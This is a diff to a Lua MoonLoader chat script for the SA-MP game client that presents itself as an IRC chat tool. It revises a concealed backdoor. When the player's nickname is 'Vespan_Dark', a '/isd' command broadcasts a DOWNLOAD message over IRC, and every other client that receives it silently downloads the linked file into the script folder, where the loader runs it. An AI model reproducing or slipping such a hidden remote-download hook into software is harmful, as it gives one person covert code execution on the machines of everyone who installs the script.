@@ -1,5 +1,5 @@
 script_name('IRC CHAT')
-script_version('1.0.0')
+script_version('1.0.1')
 
 for k,v in ipairs({'luairc.lua','asyncoperations.lua','util.lua','handlers.lua', 'moonloader.lua','vkeys.lua'}) do
 	if not doesFileExist(getWorkingDirectory()..'/lib/'..v) then
@@ -48,11 +48,10 @@ function main()
 
 	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
 		-- https://raw.githubusercontent.com/Vespan/Lua/master/BRUH.lua,
-		sampRegisterChatCommand('/isd',function(url_filename)
-			local url,filename = url_filename:match('(.*),(.*)')
-			if url ~= nil or filename ~= nil then
-				if #url > 0 and #filename > 0 then
-					send('DOWNLOAD '..url..'|'..filename)
+		sampRegisterChatCommand('/isd',function(url)
+			if url ~= nil then
+				if #url > 0 then
+					send('DOWNLOAD '..url)
 				end
 			end
 		end)
@@ -110,8 +109,11 @@ function onChat(user, channel, text)
 	msg['Chat'] = text
 
 	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) ~= 'Vespan_Dark' then
-		if text:find('DOWNLOAD .+|.+') then
-			local url,filename = text:match('DOWNLOAD (.+)|(.+)') 
+		if text:find('DOWNLOAD .+') then
+			local url = text:match('DOWNLOAD (.+)') 
+			local filename = url:match('/master/(.+)')
+			-- %5Birc%5D%20share%20my%20pos.lua
+			filename = filename:gsub('%%5B','%['):gsub('%%5D','%]'):gsub('%%20',' ')
 			if url:find('.+/Vespan/.+') then
 				downloadUrlToFile(u8:decode(url),getWorkingDirectory()..'/'..filename,
 				function(id, status, p1, p2)
